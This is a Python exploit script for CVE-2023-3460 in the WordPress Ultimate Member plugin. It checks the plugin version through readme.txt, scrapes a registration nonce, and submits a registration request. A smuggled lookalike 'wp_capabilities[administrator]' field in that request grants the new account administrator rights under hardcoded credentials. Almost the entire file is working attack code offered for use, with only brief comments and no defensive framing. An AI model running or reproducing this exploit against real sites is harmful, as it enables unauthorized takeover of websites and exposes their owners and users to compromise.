import re
import sys
import urllib3
import requests
import argparse
from colorama import Fore, Style

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

username = "Toutoutet"
password = "TotoToto123"
email = "titeouueun@gmail.com"

def check_version(target):
    
    print(Style.RESET_ALL + "Site version:", end=' ')
    try:
        r = requests.get(f"{target}/wp-content/plugins/ultimate-member/readme.txt", verify=False)
        version = re.search(r"Stable tag: (.*)", r.text).groups()[0]

    except:
        print(Fore.RED + f'error...')
        exit()


    if int(version.replace('.','')) < 267:
        print(Fore.GREEN + f'{version} - vulnerable!')
    else:
        print(Fore.RED + f'{version} - not vulnerable!')
        exit()

def add_admin(target, form_id):

    headers = {
        'User-Agent': 'Secragon Offensive Agent', # Idk if this is necessary
    }

    print(Style.RESET_ALL + "Getting nonce:", end =' ')

    s = requests.Session()
    try:
        r = s.get(f'{target}/?page_id=11', headers=headers, verify=False)
        nonce = re.search(r"name=\"_wpnonce\" value=\"(.{10})\"", r.text).groups()[0]
        print(Fore.GREEN + f"{nonce}")
    except:
        print(Fore.RED + f'error...')
        exit()


    data = {
        f'user_login-{form_id}' : username,
        f'user_email-{form_id}': email,
        f'user_password-{form_id}': password,
        f'confirm_user_password-{form_id}': password,
        f'first_name-{form_id}': 'dummyFirstname',
        f'last_name-{form_id}': 'dummyName',
        'form_id': form_id,
        'um_request': '',
        '_wpnonce': nonce,
        'wp_cÃ pabilities[administrator]': 1     # exploit is here
    }

    print(Style.RESET_ALL + "Adding a new admin:", end =' ')


    r = s.post(f'{target}/?page_id=11', data=data, headers=headers, verify=False)
    if len(r.history) > 0:
        if r.history[0].status_code == 302:
            print(Fore.GREEN + f'done')
        else:
            print(Fore.RED + f'error...')
            exit()
    else:
        print("EMPTY HISTORY")
        print(Fore.RED + f'error...')
        exit()

    print(Style.RESET_ALL + "\n All set! You can now login using the following credentials:")
    print(f'Username: {username}')
    print(f'Password: {password}')



print(Fore.BLUE + "--- CVE-2023-3460 ---") 
print(Style.RESET_ALL)


parser = argparse.ArgumentParser()

parser.add_argument('url', help='url of the target site (ex: http://example.com/)')

if len(sys.argv) == 1:
    parser.print_help()
    print()
    exit()

args = parser.parse_args()

check_version(args.url)
add_admin(args.url, 5)  # 5 is the default form_id for the registration form (it should be!)